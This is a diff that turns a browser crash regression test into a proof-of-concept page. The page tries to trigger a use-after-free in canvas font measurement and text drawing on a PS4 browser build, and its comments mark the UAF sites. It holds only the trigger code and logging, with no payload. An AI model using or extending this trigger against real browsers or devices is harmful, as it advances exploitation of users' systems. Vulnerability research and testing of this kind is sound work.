@@ -1,32 +1,78 @@
 <!DOCTYPE html>
-<p>This test passes if it does not crash.</p>
+<html><body>
+<button id="run">Run Test</button>
+<pre id="log"></pre>
 <script>
-const dummies = [];
-for (let i = 0; i < 3500; i++) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 1;
-    canvas.height = 1;
-    const dummy = canvas.getContext('2d');
-    dummy.font = '10px "dummy' + i + '"';
-    dummies.push(dummy);
+const log = s => document.getElementById('log').textContent += s + '\n';
+
+function runTest() {
+    log('--- Test A: measureText path (original UAF site) ---');
+
+    // PS4 prune threshold is 50, so 100 unique families is enough
+    const dummies = [];
+    for (let i = 0; i < 100; i++) {
+        const c = document.createElement('canvas');
+        c.width = 1; c.height = 1;
+        const ctx = c.getContext('2d');
+        ctx.font = '10px "dummy' + i + '"';
+        dummies.push(c, ctx);
+    }
+
+    // Try sub-1MB so opportunisticallyStartFontDataURLLoading fires eagerly
+    const fontURL_small = 'url("data:font/ttf;base64,' + 'A'.repeat(500000) + '")';
+    // Also keep the >1MB version as fallback
+    const fontURL_large = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+
+    const keepAlive = [];
+    for (let url of [fontURL_small, fontURL_large]) {
+        for (let attempt = 0; attempt < 4; attempt++) {
+            const metricsDonor = new FontFace('mDonor_' + attempt + '_' + url.length, url);
+            const measured = new FontFace('mTarget_' + attempt + '_' + url.length, url,
+                { unicodeRange: 'U+13A0-13FF' });
+            document.fonts.add(metricsDonor);
+            document.fonts.add(measured);
+
+            const c = document.createElement('canvas');
+            c.width = 64; c.height = 64;
+            const ctx = c.getContext('2d');
+            ctx.font = '10px mDonor_' + attempt + '_' + url.length +
+                       ', mTarget_' + attempt + '_' + url.length;
+            keepAlive.push(metricsDonor, measured, c, ctx);
+
+            // measureText path (Site 1)
+            const tm = ctx.measureText('\u13A0\u13A2\u13A4');
+            void tm.fontBoundingBoxAscent;
+            void tm.fontBoundingBoxDescent;
+            void tm.emHeightAscent;
+            void tm.emHeightDescent;
+            void tm.hangingBaseline;
+            void tm.ideographicBaseline;
+        }
+    }
+    log('measureText path done (no crash = bug not triggered via this path)');
+
+    log('--- Test B: fillText path (Site 2 — drawTextUnchecked) ---');
+    const keepAlive2 = [];
+    const fontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(500000) + '")';
+    for (let attempt = 0; attempt < 4; attempt++) {
+        const f1 = new FontFace('fDonor' + attempt, fontURL);
+        const f2 = new FontFace('fTarget' + attempt, fontURL, { unicodeRange: 'U+13A0-13FF' });
+        document.fonts.add(f1);
+        document.fonts.add(f2);
+        const c = document.createElement('canvas');
+        c.width = 64; c.height = 64;
+        const ctx = c.getContext('2d');
+        ctx.font = '10px fDonor' + attempt + ', fTarget' + attempt;
+        keepAlive2.push(f1, f2, c, ctx);
+
+        // fillText path (Site 2 — drawTextUnchecked UAF)
+        ctx.fillText('\u13A0\u13A2\u13A4', 10, 10);
+    }
+    log('fillText path done (no crash = bug not triggered via this path)');
+    log('All paths complete — if you reached here without a crash, the synchronous');
+    log('font invalidation during width() is not firing on this PS4 browser build.');
 }
 
-const keepAlive = [];
-for (let attempt = 0; attempt < 2; attempt++) {
-    const missingFontURL = 'url("missing-font-' + attempt + '.otf")';
-
-    const metricsDonor = new FontFace('metricsDonor' + attempt, missingFontURL);
-    const measured = new FontFace('measured' + attempt, missingFontURL, { unicodeRange: 'U+13A0-13FF' });
-    document.fonts.add(metricsDonor);
-    document.fonts.add(measured);
-
-    const canvas = document.createElement('canvas');
-    canvas.width = 64;
-    canvas.height = 64;
-    const context = canvas.getContext('2d');
-    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
-    keepAlive.push(metricsDonor, measured, canvas, context);
-
-    context.measureText('\u13A0\u13A2\u13A4');
-}
+document.getElementById('run').addEventListener('click', runTest);
 </script>
+</body></html>
